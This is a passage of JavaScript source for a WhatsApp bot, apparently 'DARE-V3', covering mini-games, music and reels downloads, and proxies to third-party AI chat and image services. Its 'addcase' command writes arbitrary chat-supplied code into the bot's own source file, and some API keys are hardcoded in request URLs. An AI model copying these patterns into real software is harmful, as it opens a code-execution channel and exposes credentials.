⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Arrive at your destination....
`.trim()

        var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️ 🚶
➕ 🙂Receive salary....
`.trim()

        var hsl = `
*—[ Motorbike taxi results ${name} ]—*
➕ 🙂 Money = [ ${rbrb4} ]
➕ 🙂 Exp = [ ${rbrb5} ]
➕ 😍 Order Completed = +1
➕ 📥Total Previous Orders : ${order}
`.trim()
        
        user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1

		Dare.misi[id] = [
            kerja,
            setTimeout(() => {
                delete Dare.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            m.reply(hsl)
        }, 27000)

        setTimeout(() => {
            m.reply(dimas4)
        }, 25000)

        setTimeout(() => {
            m.reply(dimas3)
        }, 20000)

        setTimeout(() => {
            m.reply(dimas2)
        }, 15000)

        setTimeout(() => {
            m.reply(dimas)
        }, 10000)

        setTimeout(() => {
            m.reply('🔍Looking for customers.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else m.reply(`Please wait for ${timers}, to complete the mission again`)
}
break
//==================================================================
case 'maling':
case 'thief': {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
const timeout = 604800000

    let user = db.users[m.sender]
    let time = user.lastmaling + 604800000
    if (new Date - user.lastmaling< 604800000) return m.reply(`📮You've robbed a bank\nWait for ⏲️ ${msToTime(time - new Date())} Again`)
	let money = `${Math.floor(Math.random() * 30000)}`.trim()
	let exp = `${Math.floor(Math.random() * 999)}`.trim()
	let kardus = `${Math.floor(Math.random() * 1000)}`.trim()
	user.money += money * 1
	user.exp += exp * 1
	user.kardus += kardus * 1
	user.lastmaling = new Date * 1
    m.reply(`Congratulations you got it : \n💰+${money} Money\📦+${kardus} Cardboard box\n🙂+${exp} Exp`)
    setTimeout(() => {
        reply(`Come on, it's thief time again 🙂…`)
    }, timeout)
}
break
//==================================================================
case 'mancing':
case 'fishing': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = Dare.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Memancing'
    Dare.misi = Dare.misi ? Dare.misi : {}
    if (id in Dare.misi) {
        reply(`Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (user.umpan == 0) return m.reply('You Need Bait To Fish!')
    if (user.fishingrod == 0 ) return m.reply('You Must Have a Fishing Rod 🎣 Above all If You Want to Fish')
    if (new Date - user.lastmisi > 3600000) {
		let ikan1 = Math.floor(Math.random() * 5)
		let ikan2 = Math.floor(Math.random() * 5)
		let ikan3 = Math.floor(Math.random() * 5)
		let ikan4 = Math.floor(Math.random() * 5)
		let ikan5 = Math.floor(Math.random() * 5)
		let ikan6 = Math.floor(Math.random() * 5)
		let ikan7 = Math.floor(Math.random() * 5)
		let ikan8 = Math.floor(Math.random() * 5)
		let ikan9 = Math.floor(Math.random() * 5)
		let ikan10 = Math.floor(Math.random() * 5)
		let ikan11 = Math.floor(Math.random() * 5)
           
		let hsl = `   
*📮 Hasil tangkapan Mu*
${ikan1 ? `
🦀 Kepiting: ${ikan1}` : ''} ${ikan2 ? `
🦞 Lobster: ${ikan2}` : ''} ${ikan3 ? `
🦐 Udang: ${ikan3}` : ''} ${ikan4 ? `
🦑 Cumi: ${ikan4}` : ''} ${ikan5 ? `
🐙 Gurita: ${ikan5}` : ''} ${ikan6 ? `
🐡 Buntal: ${ikan6}` : ''} ${ikan7 ? `
🐠 Dory: ${ikan7}` : ''} ${ikan8 ? `
🐳 Orca: ${ikan8}` : ''} ${ikan9 ? `
🐬 Lumba: ${ikan9}` : ''} ${ikan10 ? `
🐋 Paus: ${ikan10}` : ''} ${ikan11 ? `
🦈 Hiu: ${ikan11}` : ''}
`.trim()
		user.kepiting += ikan1
		user.lobster += ikan2
		user.udang += ikan3
		user.cumi += ikan4
		user.gurita += ikan5
		user.buntal += ikan6
		user.dory += ikan7
		user.orca += ikan8
		user.lumba += ikan9
		user.paus += ikan10
		user.hiu += ikan11
		user.fishingroddurability -= 10
		user.umpan -= 1
		
		Dare.misi[id] = [
        kerja,
        setTimeout(() => {
            delete Dare.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			m.reply(hsl)
		}, 20000)

		setTimeout(() => {
			m.reply(`Here are your catches`)
		}, 18000)

		setTimeout(() => {
			m.reply('You Successfully Pulled the Fish Out of the Water')
		}, 15000)

		setTimeout(() => {
			m.reply('You Pull Your Hook')
		}, 12000)
		
		setTimeout(() => {
			m.reply('Your hook is pulled by the fish...')
		}, 9000)

		setTimeout(() => {
			m.reply('Youre Fishing...')
		}, 0)
		user.lastmisi = new Date * 1
	} else m.reply(`Please Wait for ${timers} Before Starting the Mission Again`)
}
break

//==================================================================
case 'nguli':
case 'hangout': {
  if (!m.isGroup) return reply(mess.only.group)
    if (new Date - global.db.users[m.sender].lastnguli > 86400000) {
      global.db.users[m.sender].limit += 10
      m.reply('_🎉Congratulations you got it +10 limit_')
      global.db.users[m.sender].lastnguli = new Date * 1
    } else m.reply('[💬] Youve claimed your paycheck today')
  }
break
//==================================================================
case "play": {
  await loading();
  try {
    if (!text) return replydare(`🎵 *Example:* ${prefix + command} anime whatsapp status`);

    const yts = require("yt-search");
    const axios = require("axios");
    const fetch = require("node-fetch");

    // Search YouTube
    const search = await yts(text);
    if (!search || search.videos.length === 0) {
      return replydare('❌ *No video found.* Try a different keyword.');
    }

    const video = search.videos[0];
    const { title, thumbnail, videoId } = video;
    const youtubeUrl = `https://www.youtube.com/watch?v=${videoId}`;

    // Fetch audio from the API
    const apiUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(youtubeUrl)}`;
    console.log(`Fetching audio from: ${apiUrl}`);

    const response = await axios.get(apiUrl);
    console.log("API Response:", response.data);

    // Extract the audio URL correctly
    const audioUrl = response.data?.result?.download_url;

    if (!audioUrl) {
      return replydare('🚫 *Failed to fetch audio link.* API response was unexpected.');
    }

    // Prepare the audio message as a voice note (PTT)
    const audioDetails = {
      audio: { url: audioUrl },
      mimetype: 'audio/mpeg',
      fileName: `${response.data.result.title || title}.mp3`,
      ptt: true,  // ✅ Sends as a voice note (PTT)
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          mediaType: 2,
          mediaUrl: youtubeUrl,
          title: response.data.result.title || title,
          body: 'DARE-V3 BY BMB',
          sourceUrl: youtubeUrl,
          thumbnail: await (await fetch(response.data.result.thumbnail || thumbnail)).buffer()
        }
      }
    };

    await Dare.sendMessage(m.chat, audioDetails, { quoted: m });

  } catch (error) {
    console.error("Error in music command:", error);

    if (error.response) {
      replydare(`⚠️ *API Error:* ${error.response.data.message || 'Unknown error.'}`);
    } else if (error.request) {
      replydare("⚠️ *No response from API server.*");
    } else {
      replydare(`⚠️ *Request Error:* ${error.message}`);
    }
  }
}
break;

case 'instareels':
case 'instagramreels':
case 'reels': {
    if (!text) return m.reply(`ENTER SEARCH TEXT ✅`)
    await Dare.sendMessage(m.chat, {
        react: {
            text: "⌛",
            key: m.key,
        }
    })
    try {
        let cardreels = []
        let reelsvid = (await axios.get(`https://api.vreden.web.id/api/instagram/reels?query=${encodeURIComponent(text)}`)).data.result.media
        for (let i = 0; i < 5; i++) {
            const uploadFile = {
                upload: Dare.waUploadToServer
            };
            var instareels = await prepareWAMessageMedia({
                    video: {
                        url: reelsvid[i].reels.url
                    },
                },
                uploadFile,
            );
            cardreels.push({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: `
🎥 Play : ${reelsvid[i].statistics.play_count}
❤️ Like : ${reelsvid[i].statistics.like_count}
↗️ Share : ${reelsvid[i].statistics.share_count}
💬 Comment : ${reelsvid[i].statistics.comment_count}
👤 Nickname : ${reelsvid[i].profile.full_name}
👤 Username : ${reelsvid[i].profile.username}
🔗 Links : ${reelsvid[i].reels.video}`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "©B.M.B"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ``,
                    subtitle: "Q100 VRD",
                    videoMessage: instareels.videoMessage,
                    hasMediaAttachment: true
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                        "name": "vreden",
                        "buttonParamsJson": ""
                    }],
                })
            })
        }
        let msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `*Reels Search :*\n${text}`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "© B.M.B"
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: "*Reels Search*",
                            subtitle: "Q100 VRD",
                            hasMediaAttachment: false
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
                            cards: cardreels,
                        })
                    })
                }
            }
        }, {
            quoted: m
        })
        await Dare.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
        })
    } catch (error) {
        await m.reply("ERROR DETECTED 🚨")
    }
}
break
  
case 'music2': {
    try {
        await loading();
        if (!text) return reply(`⚠️ *Example*: ${prefix + command} Faded by Alan Walker 🎵`);

        const yts = require("yt-search");
        const axios = require("axios");

        const search = await yts(text);
        const video = search.videos[0];

        if (!video) return reply(`❌ *No results found for:* ${text}`);

        const body = `🎶 *DARE-V4 MUSIC PLAYER* 🎶\n\n` +
            `🎵 *Title:* ${video.title}\n` +
            `👀 *Views:* ${video.views}\n` +
            `⏳ *Duration:* ${video.timestamp}\n` +
            `📅 *Uploaded:* ${video.ago}\n` +
            `🔗 *URL:* ${video.url}\n\n` +
            `🎬 *Here is your video! 🎧 Audio will be sent next...*`;

        const audioApiUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;
        const videoApiUrl = `https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(video.url)}`;

        // Fetch both audio and video
        const [audioResponse, videoResponse] = await Promise.all([
            axios.get(audioApiUrl),
            axios.get(videoApiUrl)
        ]);

        // Check if both responses are successful
        if (audioResponse.data.success && videoResponse.data.success) {
            const { download_url: audioUrl, title } = audioResponse.data.result;
            const { download_url: videoUrl } = videoResponse.data.result;

            // Send Video First
            await Dare.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: 'video/mp4',
                fileName: `${title}.mp4`,
                caption: body
            }, { quoted: m });

            // Send Audio after Video
            await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay
            await Dare.sendMessage(m.chat, {
                audio: { url: audioUrl },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here is your audio file!* 🎶\n🎵 *Title:* ${title}`
            }, { quoted: m });

        } else {
            reply(`❌ *Failed to fetch the song or video! Please try again later.*`);
        }
    } catch (error) {
        console.error('🚨 Error during /play command:', error);
        reply(`⚠️ *An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'addcase': {
    if (!DareTheCreator) return reply(mess.only.owner)
    if (!text) return replydare('Wheres the case?');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'Dare.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replydare('An error occurred while writing the file:', err);
            } else {
                replydare('New case successfully added above gimage case.');
            }
        });
    } else {
        replydare('Cannot find gimage case in files.');
    }
});

}
break;

  
  // Case-case lainnya

//==================================================================
case 'unmute': { 
  reply('type .group or .gc to close or open group')
}
break

case 'mute': { 
  reply('type .group or .gc to close or open group')
}
break

case 'support': { 
  reply('𝐒𝐀𝐋𝐀𝐌 𝐒𝐈𝐑, To join support group click this link: https://chat.whatsapp.com/DbdznatuuTsJeX3Bwnk0m1')
}
break

case 'nanobot': {
  const msgai = `${global.botname} 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐁𝐎𝐓 BOT IS ACTIVE sɪʀ`
await Dare.sendMessage(m.chat, {
      audio: { url: `https://nue-api.vercel.app/api/tts?lang=id&text=${msgai}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
}
break

case '37337': {
  const msgai = 'I dont have a religion'
Dare.sendMessage(m.chat, {
      audio: { url: `https://nue-api.vercel.app/api/tts?lang=id&text=${msgai}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
}
break
//==================================================================
case 'aivo': {
  if (!text) return replydare(`Example : ${command} who is Jokowi?`);
  reply(mess.wait);
  try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?prompt=kamu%20adalah%20Dare%20nano,%20yang%20memiliki%20sifat%20baik%20dan%20sopan%20,%20kamu%20memiliki%20chanel%20YouTube%20bernama%20Dare%20nano&text=${encodeURIComponent(text)}`)
const hangsul = ainya.result
    await Dare.sendMessage(m.chat, {
      audio: { url: `https://nue-api.vercel.app/api/tts?lang=id&text=${hangsul}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
  } catch (error) {
    console.error(error);
    reply('Sorry, an error occurred while contacting the server.');
  }
}
break;
//==================================================================
case 'prodia': {
	if (!text) return replydare('mau buat gambar apa')
	reply(mess.wait)
	try {
	let nanod = await fetchJson(`https://itzpire.com/ai/prodia?model=AOM3A3_orangemixs.safetensors%20%5B9600da17%5D&sampler=Euler%20a&prompt=${encodeURIComponent(text)}`)
	const hasilnan = nanod.data.img
	Dare.sendMessage(from, { image: {url:hasilnan}}, { quoted: m })
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
	}
	break
	case 'lamaai': {
                if (!text) return replydare('What is your question?')
                const data1 = await fetchJson(`https://skizo.tech/api/openai?apikey=nanogembul&text=${encodeURIComponent(text)}&system=You are not YASSxOFC `)
    const msgai = data1.result;
replydare(`${msgai}`)
           }
            break
            case 'geminiai': {
                if (!text) return replydare('What is your question?')
                const data1 = await fetchJson(`https://skizo.tech/api/openai?apikey=nanogembul&text=${encodeURIComponent(text)}&system=You are not YASSxOFC `)
    const msgai = data1.result;
replydare(`${msgai}`)
           }
            break
case 'aza': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
replydare(`*BANK DETAILS*
🙂 _*${global.bankowner}*_

🔢 ${global.banknumber}

🏦 _*${global.bankname}*_
*SEND SCREENSHOT AFTER PAYMENT*`)
}
break
case 'guru-ai': {
	if (!text) return replydare(`*• Example:* ${prefix + command} Who was the person who invented the computer in the Majapahit era?`);   
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await fetchJson(`https://itzpire.com/ai/degreeGuru?q=${text}`)
const ai = "GPT 4\n\n" + gpt.result
replydare(ai)
 } catch(e) {
 return replydare("`*Error sɪʀ :(*` \n\n" + e)
}
}
break
case 'gpt4':
case 'gpt': {
	if (!text) return replydare(`*• Example:* ${prefix + command} Botz Is`);   
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
replydare("Loading...")
        try {
let gpt = await fetchJson(`https://api.giftedtech.my.id/api/ai/gpt-turbo?apikey=gifted&q=${text}`)
const ai = "RESULT\n\n" + gpt.result
replydare(ai)
 } catch(e) {
 return replydare("`*Error sɪʀ :(*` \n\n" + e)
}
}
break

    case 'claude-ai': {
    if (!text) return reply(`*• Example:* ${prefix + command} how to make girl pregnant`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json();

        if (gpt.result && gpt.result.response) {
            let messageContent = `> Claude AI\n\n${gpt.result.response}`;
            await Dare.sendMessage(m.chat, { text: messageContent }, { quoted: m });
        } else {
            reply('Unable to get a response. Please try again later.');
        }
    } catch (e) {
        console.error('Error:', e);
        reply('`*An error occurred while processing your request. Please try again later.*`');
    }
}
break;
case 'costume-ai': {
    if (!text) return reply(`*• Example:* ${prefix + command} how to make girl pregnant`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://itzpire.com/ai/gpt-logic?q=${text}&logic=${text}&realtime=true`)).json();

        if (gpt.data && gpt.data.response) {
            let messageContent = `> Costume AI\n\n${gpt.data.response}`;
            await Dare.sendMessage(m.chat, { text: messageContent }, { quoted: m });
        } else {
            reply('Unable to get a response. Please try again later.');
        }
    } catch (e) {
        console.error('Error:', e);
        reply('`*An error occurred while processing your request. Please try again later.*`');
    }
}
break;
case 'herc-ai': {
    if (!text) return reply(`*• Example:* ${prefix + command} how to make girl pregnant`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://itzpire.com/ai/hercai-chat?model=v3&q=${text}`)).json();

        if (gpt.result && gpt.result.response) {
            let messageContent = `> Herc AI\n\n${gpt.result.response}`;
            await Dare.sendMessage(m.chat, { text: messageContent }, { quoted: m });
        } else {
            reply('Unable to get a response. Please try again later.');
        }
    } catch (e) {
        console.error('Error:', e);
        reply('`*An error occurred while processing your request. Please try again later.*`');
    }
}
break;
case 'hercaiv1': {
    if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v1&prompt=${text}`)).json();

        if (gpt.data && gpt.data.response) {
            let imageUrl = gpt.data.response;
            let messageContent = `> Herc AI V1\n\n_*Here is the result of: ${text}*_`;

            let msgs = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: messageContent
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false,
                                ...await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: Dare.waUploadToServer })
                            }),
                            contextInfo: {
                                mentionedJid: [m.sender],
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '100000000000000000@newsletter',
                                    newsletterName: ownername,
                                    serverMessageId: 143
                                }
                            }
                        })
                    }
                }
            }, { quoted: m });

            await Dare.relayMessage(m.chat, msgs.message, {});
        } else {
            reply('Unable to get a valid response. Please try again later.');
        }
    } catch (e) {
        console.error('Error:', e);
        reply("`*An error occurred while processing your request. Please try again later.*`");
    }
}
break;
    case 'hercai-cartoon': {
	if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);   
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Dare.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 🙂 *CHANNEL LINK:* https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Dare.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-cartoon': {
    if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);

    await Dare.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json();

        if (gpt.data && gpt.data.response) {
            let imageUrl = gpt.data.response;
            let messageContent = `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`;

            let msgs = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: messageContent
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false,
                                ...await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: Dare.waUploadToServer })
                            }),
                            contextInfo: {
                                mentionedJid: [m.sender],
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '100000000000000000@newsletter',
                                    newsletterName: ownername,
                                    serverMessageId: 143
                                }
                            }
                        })
                    }
                }
            }, { quoted: m });

            await Dare.relayMessage(m.chat, msgs.message, {});
        } else {
            reply('Unable to get a valid response. Please try again later.');
        }
    } catch (e) {
        console.error('Error:', e);
        reply("`*An error occurred while processing your request. Please try again later.*`");
    }
}
break;
    case 'hercai-lexica': {
	if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);  
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Dare.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 🙂 *CHANNEL LINK:* https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Dare.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);  
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Dare.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 🙂 *CHANNEL LINK:* https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Dare.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);  
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Dare.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 🙂 *CHANNEL LINK:* https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Dare.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return reply(`*• Example:* ${prefix + command} a girl singing in public`);   
await Dare.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Dare.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 🙂 *CHANNEL LINK:* https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
